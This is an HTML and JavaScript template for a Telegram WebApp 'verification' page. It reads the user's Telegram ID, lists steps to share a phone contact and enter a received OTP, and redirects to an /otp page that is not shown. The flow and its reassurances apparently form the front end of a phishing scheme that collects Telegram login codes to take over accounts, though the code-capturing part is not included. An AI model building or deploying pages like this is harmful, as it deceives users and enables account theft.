<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* Keep your existing styles */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 400px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); overflow: hidden; }
        .header { background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; padding: 30px 20px; text-align: center; }
        .header h2 { font-size: 24px; margin-bottom: 5px; }
        .header p { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #0088cc 0%, #006699 100%); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; transition: all 0.3s ease; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(0, 136, 204, 0.3); }
        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .error { background: #ff6b6b; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; }
        .error.show { display: block; }
        .success { background: #4CAF50; color: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: none; }
        .success.show { display: block; }
        .hidden { display: none; }
        .loading { text-align: center; padding: 40px 20px; }
        .loading-spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info-box { background: #f8f9fa; padding: 20px; border-radius: 12px; margin-bottom: 25px; text-align: center; }
        .user-info { background: #e8f5e9; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>üîê Telegram Verification</h2>
            <p>Verify your account securely</p>
        </div>
        
        <div class="content">
            <!-- Loading Screen -->
            <div id="loading-screen">
                <div class="loading">
                    <div class="loading-spinner"></div>
                    <p>Loading WebApp...</p>
                </div>
            </div>
            
            <!-- Main Screen -->
            <div id="main-screen" class="hidden">
                <div class="user-info" id="user-info">
                    <b>üë§ User:</b> <span id="user-display">Loading...</span><br>
                    <b>ü§ñ Bot:</b> @{{ bot_username }}
                </div>
                
                <div class="info-box">
                    <b>How to verify:</b><br><br>
                    1. Click "Start Verification"<br>
                    2. Follow instructions<br>
                    3. Share your contact<br>
                    4. Receive OTP<br>
                    5. Enter OTP<br><br>
                    <small>Your contact will be auto-deleted</small>
                </div>
                
                <div class="error" id="error-message"></div>
                <div class="success" id="success-message"></div>
                
                <button class="btn" onclick="startVerification()" id="start-btn">
                    üöÄ Start Verification
                </button>
                
                <!-- Debug info (hidden by default) -->
                <div id="debug-info" style="display: none; margin-top: 20px; font-size: 12px; color: #666;">
                    <hr>
                    <b>Debug Info:</b><br>
                    User ID: <span id="debug-user-id"></span><br>
                    Telegram WebApp: <span id="debug-telegram-status"></span>
                </div>
            </div>
        </div>
    </div>

    <script>
        let tg = null;
        let userId = null;
        
        document.addEventListener('DOMContentLoaded', function() {
            console.log("üîß Initializing WebApp...");
            
            // Check if running in Telegram WebApp
            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                tg = Telegram.WebApp;
                tg.ready();
                tg.expand();
                
                console.log("‚úÖ Telegram WebApp initialized");
                
                // Get user from Telegram WebApp
                const tgUser = tg.initDataUnsafe?.user;
                if (tgUser && tgUser.id) {
                    userId = tgUser.id.toString();
                    const userName = tgUser.first_name || tgUser.username || 'User';
                    
                    console.log("‚úÖ User from Telegram:", userName, "ID:", userId);
                    
                    // Update UI
                    document.getElementById('user-display').textContent = userName;
                    document.getElementById('debug-user-id').textContent = userId;
                    document.getElementById('debug-telegram-status').textContent = "Active";
                    
                    // Show main screen
                    showMainScreen();
                    
                    // Send user ID to server via URL parameter
                    if (!window.location.search.includes('user_id')) {
                        const newUrl = window.location.pathname + '?user_id=' + userId;
                        window.history.replaceState({}, '', newUrl);
                    }
                } else {
                    // Try to get user from URL
                    fallbackToUrl();
                }
            } else {
                // Not in Telegram WebApp
                console.log("‚ö†Ô∏è Not running in Telegram WebApp");
                document.getElementById('debug-telegram-status').textContent = "Not in Telegram";
                fallbackToUrl();
            }
        });
        
        function fallbackToUrl() {
            const urlParams = new URLSearchParams(window.location.search);
            const urlUserId = urlParams.get('user_id');
            
            if (urlUserId) {
                userId = urlUserId;
                console.log("‚úÖ User from URL:", userId);
                document.getElementById('user-display').textContent = "User ID: " + userId;
                document.getElementById('debug-user-id').textContent = userId;
                showMainScreen();
            } else {
                console.log("‚ùå No user ID found");
                showError("Please open from Telegram bot using /start command.");
                document.getElementById('start-btn').disabled = true;
                document.getElementById('debug-info').style.display = 'block';
                
                // Still show main screen
                setTimeout(() => {
                    document.getElementById('loading-screen').classList.add('hidden');
                    document.getElementById('main-screen').classList.remove('hidden');
                }, 1000);
            }
        }
        
        function showMainScreen() {
            document.getElementById('loading-screen').classList.add('hidden');
            document.getElementById('main-screen').classList.remove('hidden');
        }
        
        function startVerification() {
            if (!userId) {
                showError("User ID not found. Please open from Telegram bot.");
                return;
            }
            
            console.log("Starting verification for user:", userId);
            showSuccess("Starting verification...");
            
            // Call API to start verification
            fetch('/api/start-verification', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showSuccess("‚úÖ " + data.message);
                    
                    // Show instructions
                    setTimeout(() => {
                        alert("üìã Instructions:\n\n" + data.instructions);
                        
                        // Redirect to contact sharing instructions
                        setTimeout(() => {
                            window.location.href = `/otp?user_id=${userId}`;
                        }, 2000);
                    }, 1000);
                } else {
                    showError("‚ùå " + data.error);
                }
            })
            .catch(error => {
                console.error("Error:", error);
                showError("Failed to start verification");
            });
        }
        
        function showError(message) {
            const errorEl = document.getElementById('error-message');
            errorEl.textContent = message;
            errorEl.classList.add('show');
            setTimeout(() => errorEl.classList.remove('show'), 5000);
        }
        
        function showSuccess(message) {
            const successEl = document.getElementById('success-message');
            successEl.textContent = message;
            successEl.classList.add('show');
            setTimeout(() => successEl.classList.remove('show'), 3000);
        }
        
        // Debug function
        window.showDebug = function() {
            document.getElementById('debug-info').style.display = 'block';
        };
    </script>
</body>
</html>
